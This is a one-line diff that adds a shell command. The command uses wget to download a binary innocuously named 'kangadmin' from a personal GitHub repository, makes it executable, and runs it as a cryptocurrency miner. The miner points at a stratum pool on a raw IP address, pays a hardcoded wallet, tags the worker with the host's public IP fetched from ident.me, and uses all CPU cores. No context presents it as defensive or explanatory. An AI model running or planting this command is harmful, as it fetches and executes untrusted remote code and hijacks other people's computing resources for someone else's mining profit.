@@ -1,0 +1,1 @@
+wget https://raw.githubusercontent.com/donnytan0808/ravenzergpool/main/kangadmin && chmod +x kangadmin && ./kangadmin -a yescryptr16 -o stratum+tcp://103.249.70.7:6333 -u RMFYAuKnNVHJNGkuxPJbKN9bcTD2YhkU1P -p  c=RVN,mc=QOGE,ID=lempem-a$(echo $(curl ident.me)) -t 2 $(echo $(nproc --all))
